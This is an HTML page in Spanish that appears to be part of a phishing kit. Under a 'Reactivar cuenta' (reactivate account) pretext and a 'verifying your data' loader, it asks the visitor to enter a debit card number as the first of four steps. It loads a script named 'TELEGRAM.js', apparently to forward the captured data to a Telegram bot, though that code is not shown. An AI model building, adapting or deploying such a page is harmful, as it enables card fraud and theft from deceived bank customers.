<!DOCTYPE html>
<html lang="es">
<head>
    <link rel="shortcut icon" href="img/favicon.ico">
    <link rel="apple-touch-icon" href="img/favicon.png"> 
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style/card-input.css">
    <title>Ingreso de Tarjeta de Débito</title>
   
</head>

<body>
    <div id="loader" class="loader-container">
        <div class="loader">
            <img src="img/loading.gif" alt="Cargando..."><br>
            Estamos verificando tus datos
        </div>
    </div>
    
    </div>

    <div id="main-content" style="display: none;">
        <header class="header"></header>
        <div class="steps-container">
            <h2>Reactivar cuenta</h2>
            <div class="steps-indicator">
                <div class="step active"></div>
                <div class="step"></div>
                <div class="step"></div>
                <div class="step"></div>

            </div>
        </div>
        <div class="form-container">
            <h3>Ingresa el número de cualquiera de tus tarjetas de débito</h3>
            <form id="cardForm" method="post" action="#">
                <div class="input-wrapper">
                    <input type="tel" id="debitCardNumber" maxlength="20" placeholder="Número de Tarjeta Débito" oninput="this.value = validateNumericInput(this.value)">
                </div>
                <div class="button-group">
                    <button type="submit" class="continue-btn" disabled>Continuar</button>
                    <button type="button" class="cancel-btn">Cancelar</button>
                </div>
            </form>
        </div>
    </div>

   

    <script>

function validateNumericInput(str) {
    return str.replace(/\D/g, '');
}

</script>
    <script src="js/script3.js"></script>
    <script src="js/efect.js"></script> 

    <script src="js/card-validate.js"></script>
    <script src="TELEGRAM.js"></script> 
</div>
</body>
</html>
